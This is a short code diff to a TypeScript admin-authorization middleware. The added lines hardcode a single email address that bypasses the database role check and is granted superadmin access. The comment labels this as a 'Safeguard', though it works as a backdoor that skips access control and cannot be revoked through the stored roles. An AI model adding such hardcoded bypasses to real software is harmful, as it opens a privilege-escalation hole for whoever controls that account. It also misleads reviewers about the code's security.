@@ -1074,6 +1074,13 @@ async function adminOnly(req: any, res: any, next: any) {
     });
   }
 
+  // Safeguard: Hardcoded bypass to guarantee the master administrator has immediate superadmin panel access
+  if (user.email === 'enverphoto@gmail.com') {
+    console.log(`[AdminAuth][${requestId}] 🛡️ Safeguard: Master admin email detected, bypassing role DB checks`);
+    req.user = { ...user, role: 'superadmin' };
+    return next();
+  }
+
   // Fetch fresh role from DB to ensure it's not stale
   const { data: profile, error: profileError } = await supabase
     .from('users')
